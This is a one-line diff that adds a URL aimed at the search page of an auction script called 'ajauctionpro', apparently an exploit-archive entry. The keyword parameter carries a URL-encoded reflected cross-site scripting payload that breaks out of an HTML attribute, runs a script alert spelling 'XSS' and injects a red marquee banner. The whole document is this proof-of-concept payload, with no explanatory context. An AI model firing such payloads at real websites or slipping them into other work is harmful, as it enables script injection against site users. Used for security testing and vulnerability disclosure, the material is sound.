@@ -1,0 +1,1 @@
+http://www.example.com/ajauctionpro/oopdv3/index.php?do=search&type=&stime=&txtkeyword=%27%22%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3CMARQUEE+BGCOLOR%3D%22RED%22%3E%3CH1%3EXss%3C%2FH1%3E%3C%2FMARQUEE%3E&id=all&button=Search&select2=all&select3=endsoon
